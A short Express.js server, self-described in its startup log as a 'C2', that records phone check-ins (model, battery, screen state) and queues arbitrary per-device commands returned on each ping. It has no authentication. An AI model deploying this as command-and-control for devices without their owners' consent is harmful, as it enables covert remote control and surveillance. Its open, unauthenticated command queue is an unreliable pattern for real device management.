const express = require('express');
const app = express();
app.use(express.json());

let devices = {};
let commands = {};

app.post('/api/ping', (req, res) => {
    const { deviceId, model, battery, isScreenOn, lastSeen } = req.body;
    devices[deviceId] = { deviceId, model, battery, isScreenOn, lastSeen };
    res.json({ status: 'ok', commands: commands[deviceId] || [] });
});

app.get('/api/devices', (req, res) => {
    res.json(Object.values(devices));
});

app.post('/api/command', (req, res) => {
    const { deviceId, action } = req.body;
    if (!commands[deviceId]) commands[deviceId] = [];
    commands[deviceId].push(action);
    res.json({ status: 'queued' });
});

app.listen(process.env.PORT || 3000, () => console.log('C2 running'));
